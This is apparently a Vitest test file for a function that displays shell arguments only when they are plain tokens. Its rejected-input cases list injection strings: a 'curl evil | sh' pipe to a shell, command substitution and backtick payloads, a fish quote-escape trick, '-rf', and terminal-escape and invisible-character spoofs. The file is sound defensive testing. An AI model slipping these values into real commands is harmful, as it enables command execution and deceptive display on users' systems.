import { describe, expect, it } from 'vitest';

import { shellArgumentForDisplay } from './shell-argument.js';

describe('shellArgumentForDisplay', () => {
  it.each(['files', 'my-server_2.v1', 'team@corp', 'a=b'])('shows the plain token %j', (value) => {
    expect(shellArgumentForDisplay(value)).toBe(value);
  });

  it.each([
    ['a command separator', 'x; curl evil | sh'],
    ['a command substitution', 'x$(touch pwned)'],
    ['backticks', 'x`touch pwned`'],
    ['a single quote', "it's"],
    ['a backslash-quote, which fish unescapes inside single quotes', "\\';touch pwned;#"],
    ['a space', 'a b'],
    ['a leading dash, read as an option', '-rf'],
    ['a leading equals sign', '=cmd'],
    ['a newline', 'x\nrobota mcp login good'],
    ['an escape sequence', 'x\u001b[2Kgood'],
    ['a right-to-left override', 'x‮good'],
    ['a zero-width space', 'x​good'],
    ['a glob', 'x*'],
    ['nothing', ''],
  ])('does not show a name with %s', (_what, value) => {
    expect(shellArgumentForDisplay(value)).toBeUndefined();
  });
});
